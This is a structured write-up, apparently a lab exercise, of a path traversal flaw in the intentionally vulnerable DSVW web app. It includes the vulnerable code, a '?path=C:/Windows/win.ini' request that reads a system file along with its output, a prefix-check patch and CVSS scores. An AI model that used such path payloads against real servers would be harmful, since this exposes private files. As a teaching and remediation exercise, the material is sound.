## Version 1.4.1
## language: en

Feature:
  TOE:
    dsvw
  Category:
    Path Traversal
  Location:
    http://127.0.0.1:65412/ - path - (field)
  CWE:
    CWE-22: https://cwe.mitre.org/data/definitions/22.html
    CWE-40: https://cwe.mitre.org/data/definitions/40.html
  Rule:
    REQ.37: https://fluidattacks.com/web/rules/037/
  Goal:
    Inject a path that is outside of the restricted directory.
  Recommendation:
    validate that the path is allowed within the directory

  Background:
  Hacker's software:
    | <Software name> |   <Version>    |
    | Windows         | 10.0.1809 (x64)|
    | Chrome          | 75.0.3770.142  |
  TOE information:
    Given I am accessing the site http://127.0.0.1:65412/
    And the server is running SQLite version 3
    And Python version 2.7.16

  Scenario: Normal use case
    Given I access "http://127.0.0.1:65412/?path=https://facebook.com"
    Then It just displays the Facebook page

  Scenario: Static detection
    When I inspect the code in dsvw.py
    """
    36  elif "path" in params:
    37  content = (open(os.path.abspath(params["path"]), "rb")
    38  if not "://" in params["path"]
    39  else urllib.urlopen(params["path"])).read()
    """
    Then I see that a file is read in the path given in the parameter
    And I see the path is not being validated
    And I conclude that I can open any file store in the system

  Scenario: Dynamic detection
    Given "http://127.0.0.1:65412/?path="
    When I insert and invalid value to "path" parameter
    """
    http://127.0.0.1:65412/?path=admin
    """
    Then I get the output:
    """
    IOError: [Errno 2] No such file or directory:
    'C:\\Users\\Diego\\PycharmProjects\\DSVW-master\\admin'
    """
    Then I can conclude that it could be a possible Path Traversal attack

  Scenario: Exploitation
    Given "http://127.0.0.1:65412/?path="
    And knowing the path of a specific file
    Then I can pass the path to the parameter:
    """
    http://127.0.0.1:65412/?path=C:/Windows/win.ini
    """
    Then I get the output:
    """
    ; for 16-bit app support
    [fonts]
    [extensions]
    [mci extensions]
    [files]
    [Mail]
    MAPI=1
    """
    Then It contains data about the current environment (desktop, sources..)

  Scenario: Remediation
    Given I have patched the code by doing an "if" check before open the file
    Then the code aks if the path is in the current directory
    """
    132 if os.path.realpath(params["path"]).startswith(os.getcwd()):
    133  content = (open(os.path.abspath(params["path"]), "rb")
    134  if not "://" in params["path"]
    135  else urllib.urlopen(params["path"])).read()
    """
    Then If I pass and path that is outside of the directory:
    """
    http://127.0.0.1:65412/?path=C:/Windows/win.ini
    """
    Then It doesn't return anything
    Then I can confirm that the vulnerability was successfully patched

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    6.2/10 (Medium) - AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  Temporal: Attributes that measure the exploit's popularity and fixability
    5.8/10 (Medium) - E:F/RL:T/RC:X/
  Environmental: Unique and relevant attributes to a specific user environment
    5.8/10 (Medium) - MAC:L/MC:H/MPR:N

  Scenario: Correlations
    No correlations have been found to this date 2019-07-31
